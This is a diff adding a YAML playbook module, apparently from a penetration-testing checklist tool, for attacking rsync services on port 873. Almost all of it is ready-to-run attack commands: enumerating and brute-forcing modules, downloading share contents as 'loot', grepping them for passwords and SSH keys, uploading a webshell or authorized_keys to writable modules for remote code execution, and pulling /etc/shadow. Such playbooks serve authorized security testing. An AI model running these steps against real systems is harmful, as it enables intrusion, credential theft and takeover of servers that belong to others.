@@ -1,0 +1,69 @@
+module: rsync
+name: rsync (873)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nc -nv $IP $PORT
+      - id: list_modules
+        text: List available modules (shares)
+        commands: |
+          rsync --list-only rsync://$IP:$PORT/
+          rsync rsync://$IP:$PORT/
+          nmap -p$PORT --script=rsync-list-modules $IP
+
+  - id: enum
+    name: Module Enumeration
+    steps:
+      - id: list_contents
+        text: List contents of a module (anonymous)
+        commands: |
+          rsync --list-only rsync://$IP:$PORT/<module>/
+          rsync -av --list-only rsync://$IP:$PORT/<module>/
+      - id: auth_list
+        text: List contents with credentials (if module requires auth)
+        commands: |
+          rsync --list-only rsync://$USER@$IP:$PORT/<module>/
+          # RSYNC_PASSWORD='$PASS' rsync --list-only rsync://$USER@$IP:$PORT/<module>/
+
+  - id: creds
+    name: Authentication
+    authorized: true
+    steps:
+      - id: brute
+        text: Brute-force a module that requires auth
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/rsync/modules_list; set RHOSTS $IP; run; exit"
+          # hydra has no rsync module; script RSYNC_PASSWORD loop over $PASS
+
+  - id: exploit
+    name: File Access & Post-Exploitation
+    steps:
+      - id: pull
+        text: Download a module (loot)
+        commands: |
+          rsync -av rsync://$IP:$PORT/<module>/ $OUT/rsync-loot/
+      - id: loot
+        text: Hunt secrets in pulled data
+        manual: true
+        commands: |
+          grep -rniE 'password|id_rsa|\.kdbx|secret' $OUT/rsync-loot 2>/dev/null
+      - id: push
+        text: Upload (writable module -> webshell / cron / authorized_keys)
+        manual: true
+        commands: |
+          rsync -av ./shell.php rsync://$IP:$PORT/<module>/
+          # if module maps to a webroot or cron/ssh dir this becomes RCE
+      - id: root_backup
+        text: Note common misconfig — module rooted at / or a home dir
+        manual: true
+        commands: |
+          # if a module exposes / you can read/write arbitrary paths
+          rsync -av rsync://$IP:$PORT/<module>/etc/shadow $OUT/
